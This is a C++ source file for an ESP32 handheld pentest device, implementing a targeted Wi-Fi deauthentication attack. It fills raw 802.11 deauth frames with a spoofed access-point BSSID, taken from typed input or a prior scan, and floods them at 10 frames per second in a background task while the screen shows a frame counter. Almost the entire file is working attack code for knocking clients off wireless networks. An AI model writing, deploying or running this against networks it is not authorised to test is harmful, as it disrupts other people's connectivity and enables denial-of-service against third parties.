/*
 * wifi_deauth — targeted deauth with typed BSSID.
 *
 * Two paths in:
 *   1. Fresh entry: user types the BSSID (AA:BB:CC:DD:EE:FF) and channel
 *   2. From WiFi scan: g_last_selected_ap is pre-filled, user just hits ENTER
 *
 * Non-blocking. Deauth frames are sent at 10 pps from a background task.
 * ESC stops the attack and returns.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* Provided by wifi_scan.cpp. */
struct ap_t {
    char     ssid[33];
    uint8_t  bssid[6];
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  auth;
};
extern ap_t g_last_selected_ap;
extern bool g_last_selected_valid;

static volatile bool     s_running = false;
static volatile uint32_t s_sent    = 0;
static uint8_t           s_target[6];
static uint8_t           s_channel;

/* Raw 802.11 deauth frame (reason code 7 = class 3 frame from non-assoc'd). */
static uint8_t s_frame[26] = {
    0xC0, 0x00,                          /* type: deauth */
    0x00, 0x00,                          /* duration */
    0,0,0,0,0,0,                         /* dst = target (filled at runtime) */
    0,0,0,0,0,0,                         /* src = target */
    0,0,0,0,0,0,                         /* bssid = target */
    0x00, 0x00,                          /* seq */
    0x07, 0x00,                          /* reason */
};

static void deauth_task(void *)
{
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    memcpy(s_frame + 4,  s_target, 6);   /* dst = broadcast to station? use target */
    memcpy(s_frame + 10, s_target, 6);   /* src = AP (spoofed) */
    memcpy(s_frame + 16, s_target, 6);   /* bssid = AP */

    while (s_running) {
        esp_wifi_80211_tx(WIFI_IF_STA, s_frame, sizeof(s_frame), false);
        s_sent++;
        delay(100);  /* 10 pps — aggressive enough, polite on airtime */
    }
    vTaskDelete(nullptr);
}

static bool parse_mac(const char *s, uint8_t out[6])
{
    int v[6];
    int n = sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
    if (n != 6) return false;
    for (int i = 0; i < 6; ++i) {
        if (v[i] < 0 || v[i] > 0xFF) return false;
        out[i] = (uint8_t)v[i];
    }
    return true;
}

static bool collect_target(void)
{
    if (g_last_selected_valid) {
        memcpy(s_target, g_last_selected_ap.bssid, 6);
        s_channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
        return true;
    }
    char mac_buf[24];
    if (!input_line("Target BSSID:", mac_buf, sizeof(mac_buf))) return false;
    if (!parse_mac(mac_buf, s_target)) {
        ui_toast("invalid MAC", COL_BAD, 1000);
        return false;
    }
    char ch_buf[6];
    if (!input_line("Channel (1-13):", ch_buf, sizeof(ch_buf))) return false;
    int ch = atoi(ch_buf);
    if (ch < 1 || ch > 14) {
        ui_toast("invalid channel", COL_BAD, 1000);
        return false;
    }
    s_channel = (uint8_t)ch;
    return true;
}

void feat_wifi_deauth(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    s_sent = 0;
    s_running = false;

    if (!collect_target()) {
        esp_wifi_set_promiscuous(false);
        g_last_selected_valid = false;
        return;
    }

    s_running = true;
    xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);

    ui_clear_body();
    ui_draw_footer("ESC=stop  SPACE=pause  any=ignored");

    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 4); d.print(">> DEAUTH <<");
    d.setTextColor(COL_FG, COL_BG);
    d.setCursor(4, BODY_Y + 22);
    d.printf("%02X:%02X:%02X:%02X:%02X:%02X ch%u",
             s_target[0], s_target[1], s_target[2],
             s_target[3], s_target[4], s_target[5], s_channel);

    uint32_t last = 0;
    bool paused = false;
    while (true) {
        uint32_t now = millis();
        if (now - last > 300) {
            d.fillRect(0, BODY_Y + 50, SCR_W, 40, COL_BG);
            d.setTextColor(paused ? COL_WARN : COL_GOOD, COL_BG);
            d.setCursor(4, BODY_Y + 50);
            d.printf("frames: %lu%s", (unsigned long)s_sent, paused ? " (paused)" : "");
            last = now;
            ui_draw_status(radio_name(), paused ? "paused" : "flooding");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { s_running = false; break; }
        if (k == PK_SPACE) {
            paused = !paused;
            if (paused) { s_running = false; }
            else {
                s_running = true;
                xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
            }
        }
    }

    s_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
    g_last_selected_valid = false;
}
